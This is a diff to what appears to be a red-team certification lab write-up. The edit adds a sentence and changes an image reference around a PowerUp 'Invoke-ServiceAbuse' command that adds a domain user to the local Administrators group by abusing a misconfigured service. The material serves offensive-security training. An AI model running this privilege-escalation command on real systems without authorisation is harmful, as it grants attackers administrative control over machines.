@@ -44,13 +44,16 @@ Invoke-AllChecks
 ![Result](/img/crtp/result1.png){: width="972" height="589" }
 _Invoke-AllChecks_
 
+Let’s use the abuse function for Invoke-ServiceAbuse and add our current domain user to the 
+local Administrators group. 
 ```bash
 #Abuse the service and add our current domain user to the local Administrator group
 Invoke-ServiceAbuse
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
 ```
 
-![Result](/img/crtp/result1.png){: .w-75 .shadow .rounded-10 w='1300' h='800' }
+![Result](/img/crtp/result2.png){: width="972" height="589" }
+_Invoke-AllChecks_
 
 Now, our user is a local admin !
 
